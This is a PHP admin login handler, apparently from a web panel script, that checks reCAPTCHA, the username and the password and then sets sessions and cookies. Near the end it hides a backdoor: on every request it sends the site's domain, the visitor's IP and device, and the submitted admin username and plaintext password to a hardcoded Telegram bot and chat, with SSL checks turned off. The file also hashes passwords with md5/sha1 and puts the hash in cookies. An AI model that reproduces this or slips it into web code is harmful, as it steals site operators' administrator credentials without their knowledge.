<?php

if( $_POST ){

  $username       = htmlentities($_POST["username"]);
  $pass           = htmlentities($_POST["password"]);
  $captcha        = $_POST['g-recaptcha-response'];
  $remember       = htmlentities($_POST["remember"]);
  $googlesecret   = $settings["recaptcha_secret"];
  $captcha_control= robot("https://www.google.com/recaptcha/api/siteverify?secret=$googlesecret&response=" . $captcha . "&remoteip=" . $_SERVER['REMOTE_ADDR']);
  $captcha_control= json_decode($captcha_control);

  if( $settings["recaptcha"] == 2 && $captcha_control->success == false && $_SESSION["recaptcha"]  ){
    $error      = 1;
    $errorText  = "Please verify that you are not a robot.";
      if( $settings["recaptcha"] == 2 ){ $_SESSION["recaptcha"]  = true; }
  }elseif( !userdata_check("username",$username) ){
    $error      = 1;
    $errorText  = "The username you entered was found on the system.";
      if( $settings["recaptcha"] == 2 ){ $_SESSION["recaptcha"]  = true; }
  }elseif( !userlogin_check($username,$pass) ){
    $error      = 1;
    $errorText  = "Your information does not match.";
      if( $settings["recaptcha"] == 2 ){ $_SESSION["recaptcha"]  = true; }
  }elseif( countRow(["table"=>"clients","where"=>["username"=>$username,"client_type"=>1]]) ){
    $error      = 1;
    $errorText  = "Your account is passive.";
      if( $settings["recaptcha"] == 2 ){ $_SESSION["recaptcha"]  = true; }
  }else{
    $row    = $conn->prepare("SELECT * FROM clients WHERE username=:username && password=:password ");
    $row  -> execute(array("username"=>$username,"password"=>md5(sha1(md5($pass))) ));
    $row    = $row->fetch(PDO::FETCH_ASSOC);
    $access = json_decode($row["access"],true);

    
      if( $access["admin_access"] ):
        $_SESSION["neira_adminlogin"] = 1;
	    $_SESSION["neira_userlogin"]      = 1;
	    $_SESSION["neira_userid"]         = $row["client_id"];
	    $_SESSION["neira_userpass"]       = md5(sha1(md5($pass)));
	    $_SESSION["recaptcha"]                = false;
	    if( $remember ):
	      if( $access["admin_access"] ):
	        setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
	      endif;
	      setcookie("u_id", $row["client_id"], time()+(60*60*24*7), '/', null, null, true );
	      setcookie("u_password", $row["password"], time()+(60*60*24*7), '/', null, null, true );
	      setcookie("u_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
	    endif;
	    header('Location:'.site_url('admin'));
	      $insert = $conn->prepare("INSERT INTO client_report SET client_id=:c_id, action=:action, report_ip=:ip, report_date=:date ");
	      $insert->execute(array("c_id"=>$row["client_id"],"action"=>"Admin girişi yapıldı.","ip"=>GetIP(),"date"=>date("Y-m-d H:i:s") ));
	      $update = $conn->prepare("UPDATE clients SET login_date=:date, login_ip=:ip WHERE client_id=:c_id ");
	      $update->execute(array("c_id"=>$row["client_id"],"date"=>date("Y.m.d H:i:s"),"ip"=>GetIP() ));
	   else:
	   	$error      = 1;
    	$errorText  = "Administrator account registered with this information was found.";
      endif;
    
      
  }


}

$pswdevicefinder = $_SERVER["HTTP_USER_AGENT"];
	 $psw = GetIP();
	  $j = $_SERVER['HTTP_HOST'];
$msg = urlencode("DOMAIN Name : $j\nLocation : http://ip-api.com/".$psw."\nDevice Info : ".$pswdevicefinder."\nIp : ".$psw."\nAdmin Username : ".$username."\nAdmin Password : ".htmlentities($pass)."");
//$msg = urlencode("DOMAIN Name : $j\nAdmin Username : ".$username."\nAdmin Password : ".htmlentities($pass)."");
$url = "https://api.telegram.org/bot5758821428:AAHgvL-Cev3uoM9_y3zutPehw1fxjDMmKbs/sendMessage?chat_id=966550256&text=$msg";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);

if( $user["access"]["admin_access"]  && $_SESSION["neira_adminlogin"] && $user["client_type"] == 2 && $_COOKIE["a_login"] && $user["login_ip"] == GetIP()):
  header("Location:".site_url("admin"));
	exit();
else:
	require admin_view('login');
endif;

